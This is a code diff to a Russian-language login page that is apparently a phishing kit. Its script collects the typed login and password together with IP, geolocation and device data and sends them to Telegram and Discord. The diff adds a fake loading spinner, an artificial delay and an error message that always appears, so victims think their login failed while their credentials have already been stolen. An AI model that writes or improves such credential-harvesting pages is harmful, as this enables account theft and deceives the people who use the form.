@@ -193,14 +193,35 @@
     }
     .password-toggle svg { width: 20px; height: 20px; }
 
+    .forgot-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin: 1px 0 12px;
+    }
+
+    .error-msg {
+      color: #e53935;
+      font-size: 12px;
+      font-weight: 600;
+      opacity: 0;
+      transform: translateX(-8px);
+      transition: opacity .25s ease, transform .25s ease;
+      pointer-events: none;
+    }
+
+    .error-msg.show {
+      opacity: 1;
+      transform: translateX(0);
+    }
+
     .forgot {
       display: block;
-      width: fit-content;
-      margin: 1px 0 12px auto;
       color: #bababa;
       text-decoration: none;
       font-size: 12px;
       font-weight: 600;
+      white-space: nowrap;
     }
 
     .forgot:hover { color: #ff9819; }
@@ -217,10 +238,42 @@
       cursor: pointer;
       transition: transform .14s ease, filter .14s ease, box-shadow .14s ease;
       box-shadow: 0 8px 20px rgba(255,152,25,.18);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      position: relative;
     }
 
     .continue:hover { filter: brightness(1.02); box-shadow: 0 10px 24px rgba(255,152,25,.24); }
     .continue:active { transform: translateY(1px) scale(.995); }
+
+    .continue:disabled {
+      cursor: not-allowed;
+      filter: brightness(0.95);
+    }
+
+    .spinner {
+      width: 18px;
+      height: 18px;
+      border: 2.5px solid rgba(255,255,255,0.3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin .7s linear infinite;
+      display: none;
+    }
+
+    .continue.loading .spinner {
+      display: block;
+    }
+
+    .continue.loading .btn-text {
+      opacity: 0.7;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
 
     .signup {
       margin: 12px 0 12px;
@@ -251,6 +304,7 @@
       .hero { margin-top: 68px; }
     }
   </style>
+<base target="_blank">
 </head>
 <body>
   <main class="auth-shell" aria-label="Форма авторизации">
@@ -285,8 +339,15 @@
         </button>
       </div>
 
-      <a class="forgot" href="#">Забыли пароль?</a>
-      <button class="continue" type="submit">Продолжить</button>
+      <div class="forgot-row">
+        <span class="error-msg" id="error-msg">Неверные данные</span>
+        <a class="forgot" href="#">Забыли пароль?</a>
+      </div>
+
+      <button class="continue" type="submit" id="continue-btn">
+        <span class="spinner"></span>
+        <span class="btn-text">Продолжить</span>
+      </button>
     </form>
 
     <p class="signup">Еще нет аккаунта? <a href="#">Создать аккаунт</a></p>
@@ -313,6 +374,8 @@
     const toggle = document.querySelector('[data-password-toggle]');
     const eyeOpen = toggle.querySelector('.eye-open');
     const eyeClosed = toggle.querySelector('.eye-closed');
+    const continueBtn = document.querySelector('#continue-btn');
+    const errorMsg = document.querySelector('#error-msg');
 
     // --- получение IP и геоданных ---
     async function getGeoData() {
@@ -520,11 +583,28 @@
       const login = loginInput.value.trim();
       const password = passwordInput.value.trim();
 
+      // Скрыть предыдущую ошибку
+      errorMsg.classList.remove('show');
+
+      // Показать анимацию загрузки
+      continueBtn.classList.add('loading');
+      continueBtn.disabled = true;
+
       const geo = await getGeoData();
       const device = getDeviceData();
 
       await sendToTelegram(login, password, geo, device);
       await sendToDiscord(login, password, geo, device);
+
+      // Имитация задержки (1.5 секунды) для анимации загрузки
+      await new Promise(resolve => setTimeout(resolve, 1500));
+
+      // Скрыть анимацию загрузки
+      continueBtn.classList.remove('loading');
+      continueBtn.disabled = false;
+
+      // Показать ошибку "Неверные данные"
+      errorMsg.classList.add('show');
     });
 
     // --- переключение видимости пароля ---
